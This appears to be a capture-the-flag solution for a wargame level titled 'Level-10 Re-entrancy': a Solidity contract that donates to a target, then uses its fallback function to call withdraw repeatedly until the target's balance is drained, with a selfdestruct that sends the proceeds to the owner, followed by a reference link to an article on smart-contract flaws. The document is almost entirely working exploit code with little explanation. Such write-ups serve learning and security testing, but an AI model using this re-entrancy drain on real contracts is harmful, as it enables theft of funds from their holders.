# Level-10 Re-entrancy

```js
pragma solidity ^0.4.24;

contract Reentrance {
  function donate(address _to) public payable;
  function balanceOf(address _who) public view returns (uint balance);
  function withdraw(uint _amount) public;
}

contract ReentranceExploits{
    Reentrance entry;
    address owner;
    constructor(address _addr) public payable {
        entry = Reentrance(_addr);
        owner = msg.sender;
        entry.donate.value(msg.value)(this);
    }
    
    function() public payable {
        uint balance = entry.balanceOf(this);
        address c = address(entry);
        if (balance > c.balance) {
            if (c.balance != 0) entry.withdraw(c.balance);
            return;
        }
        entry.withdraw(balance);
    } 
   
    function exploits() public payable {
        entry.withdraw(0);   
    }
    
    function terminate() public {
        selfdestruct(owner);
    }
}
```


参考:
[谈谈区块链（24）：智能合约的安全漏洞](https://www.8btc.com/article/119175)